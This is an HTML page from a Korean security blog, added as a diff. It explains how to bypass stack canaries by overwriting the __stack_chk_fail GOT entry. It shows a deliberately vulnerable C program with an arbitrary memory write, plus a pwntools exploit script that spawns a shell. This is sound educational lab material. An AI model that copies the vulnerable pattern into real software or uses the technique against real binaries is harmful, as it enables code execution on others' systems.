@@ -1,0 +1,108 @@
+<!doctype html>
+<html lang="ko" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[PWNABLE] Canary_GOT Overwrite · whrds.log</title><meta name="description" content="※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 앞서 Canary기법과 우회하는 방법에 대해 포스팅을 했다, https://whrdud727.tistory.com/10 [PWNABLE] Canary_설명 ※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ SSP(Stack S">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/ko/posts/pwnable-canary-got-overwrite/">
+  <link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/pwnable-canary-got-overwrite/"><link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/pwnable-canary-got-overwrite/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[PWNABLE] Canary_GOT Overwrite · whrds.log"><meta property="og:description" content="※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 앞서 Canary기법과 우회하는 방법에 대해 포스팅을 했다, https://whrdud727.tistory.com/10 [PWNABLE] Canary_설명 ※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ SSP(Stack S"><meta property="og:url" content="https://whrds.github.io/ko/posts/pwnable-canary-got-overwrite/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[PWNABLE] Canary_GOT Overwrite","description":"※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 앞서 Canary기법과 우회하는 방법에 대해 포스팅을 했다, https://whrdud727.tistory.com/10 [PWNABLE] Canary_설명 ※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ SSP(Stack S","datePublished":"2023-10-22","inLanguage":"ko","url":"https://whrds.github.io/ko/posts/pwnable-canary-got-overwrite/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">본문으로 건너뛰기</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/ko/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="주 메뉴">
+      <a href="/ko/" aria-current="page">글</a>
+      <a href="/ko/about/">소개</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="#" class="active" lang="ko" aria-current="true">KO</a>
+        <a href="/en/posts/pwnable-canary-got-overwrite/" class="" lang="en">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[PWNABLE] Canary_GOT Overwrite</h1><p class="article-description">※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 앞서 Canary기법과 우회하는 방법에 대해 포스팅을 했다, https://whrdud727.tistory.com/10 [PWNABLE] Canary_설명 ※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ SSP(Stack S</p><div class="article-meta"><time datetime="2023-10-22">2023년 10월 22일</time><span>·</span><span>1 분 읽기</span></div></header><div class="prose"><p><strong>※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다.</strong> <strong>※</strong> </p>
+<p><strong>앞서 Canary기법과 우회하는 방법에 대해 포스팅을 했다,</strong></p>
+<p><strong><a href="https://whrdud727.tistory.com/10">https://whrdud727.tistory.com/10</a></strong></p>
+<p> [[PWNABLE] Canary_설명</p>
+<p>※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ SSP(Stack Smashing Protector) Stack buffer Overflow로부터 sfp와 ret를 보호하기 위한 기법으로, Stack의 canary라는 값을 이용하여 검증</p>
+<p><a href="http://whrdud727.tistory.com">whrdud727.tistory.com</a>](<a href="https://whrdud727.tistory.com/10">https://whrdud727.tistory.com/10</a>)</p>
+<p><a href="https://whrdud727.tistory.com/11">https://whrdud727.tistory.com/11</a></p>
+<p> [[PWNABLE] Canary 우회</p>
+<p>※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 이전 포스팅에서 canary에 대해 다루었다. 이번에는 그 우회 방법들을 다루겠다. 1. canary leak 2. got overwrite (간단하게만 설</p>
+<p><a href="http://whrdud727.tistory.com">whrdud727.tistory.com</a>](<a href="https://whrdud727.tistory.com/11">https://whrdud727.tistory.com/11</a>)</p>
+<p>우회 기법을 설명 중 공격 기법인 GOT Overwrite에 대한 지식이 필요한 부분이 있어 해당 부분을 남겨두었었는데</p>
+<p>이번 게시글에서 설명을 해보겠다.</p>
+<p>바이너리 파일 안에서 Canary가 변조되었는지 확인하는 함수를 '__stack_chk_fail’함수라고 했었다.</p>
+<p>해당 함수의 경우 다른 함수들과 마찬가지로 plt와 got를 이용하여 호출된다.</p>
+<p><img src="/assets/images/tistory/tistory-be437eb64d47/001.png" alt=""></p>
+<p>어떤 식으로 접근해야할지 눈치를 챘을 것이다.</p>
+<p>당연하게도 __stack_chk_fail@got를 다른 함수의 주소로 덮어씌우면 우회가 가능하다.</p>
+<p>간단한 예제를 하나 가지고 실습해보겠다.</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void shell(){
+    system(&quot;/bin/sh&quot;);
+}
+
+int main(){
+    unsigned long long addr = 0;
+    char s[8];
+
+    read(0,s,20);
+    write(1,&quot;Addr :&quot;,6);
+    scanf(&quot;%lld&quot;, &amp;addr);
+    write(1,&quot;Value :&quot;,7);
+    scanf(&quot;%lld&quot;, (void *)addr);
+    printf(&quot;Good Bye~ whrd&quot;);
+
+    return 0;
+}
+</code></pre>
+<p>첫 번째 입력에서 함수의 got 주소를 입력하고,</p>
+<p>두 번째 입력에서 변경하고자 하는 함수의 주소를 입력하면 되는 간단한 예제이다.</p>
+<p>pwntools의 기능을 이용하여 함수의 주소를 쉽게 구할수도 있겠지만</p>
+<p>pwnable 공부 초반에서는 직접 보면서 하는것이 좋기 때문에 해당 방법을 기준으로 진행하겠다.</p>
+<p><img src="/assets/images/tistory/tistory-be437eb64d47/002.png" alt=""></p>
+<p>특정 함수의 주소만 보면 되는 것이기 때문에 print 명령을 이용했지만,</p>
+<p>info func를 이용하여 __stack_chk_fail@plt 주소를 찾아도 된다.</p>
+<p>다시 코드를 보면 셸을 실행시키는 shell()이라는 함수가 존재하는 것을 볼 수 있다.</p>
+<p>마침 __stack_chk_fail함수는 메인함수의 종료 직전에 실행되게 된다.</p>
+<p><img src="/assets/images/tistory/tistory-be437eb64d47/003.png" alt=""></p>
+<p>__stack_chk_fail@got를 shell()의 주소로 덮어쓴다면 셸을 바로 얻을 수 있을 것이다.</p>
+<p><img src="/assets/images/tistory/tistory-be437eb64d47/004.png" alt=""></p>
+<p>이제 필요한 준비물들은 다 구해주었다.</p>
+<p>이제 공격을 위한 페이로드를 작성해보겠다.</p>
+<pre><code>from pwn import*
+
+p = process('./ex1')
+
+shell= 0x4011d6
+stack_fail = 0x403348
+#shell = e.sym['shell']
+#stack_fail = e.got['__stack_chk_fail']
+
+p.send(b&quot;a&quot;*16)
+p.sendlineafter(b&quot;:&quot;,str(stack_fail))
+p.sendlineafter(b&quot;:&quot;,str(shell+4))
+
+p.interactive()
+</code></pre>
+<p>위 페이로드를 실행하면 정상적으로 셸을 따진 것을 확인할 수 있다.</p>
+<p><img src="/assets/images/tistory/tistory-be437eb64d47/005.png" alt=""></p>
+<p>GOT Overwrite 공격 전 got 상태</p>
+<p><img src="/assets/images/tistory/tistory-be437eb64d47/006.png" alt=""></p>
+<p> GOT Overwrite 공격 이후 got 상태</p>
+<p><img src="/assets/images/tistory/tistory-be437eb64d47/007.png" alt=""></p>
+<p>정상적으로 값이 덮어씌워졌다.</p>
+<p>Canary를 변조를 해주었기 때문에 main함수가 종료되면서 __stack_chk_fail함수를 호출시킨다.</p>
+<p>이때 해당 함수에는 우리가 shell이라는 함수의 주소로 씌워주었기 때문에 해당 주소가 들어있다.</p>
+<p>즉, shell함수가 실행이 되면서 셸이 따지는 것이다.</p>
+</div><div class="article-end"><a href="/ko/">← 모든 글 보기</a><a href="/en/posts/pwnable-canary-got-overwrite/" hreflang="en">이 글을 영어로 읽기 →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>관찰하고, 검증하고, 기록합니다.</span><a href="/ko/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
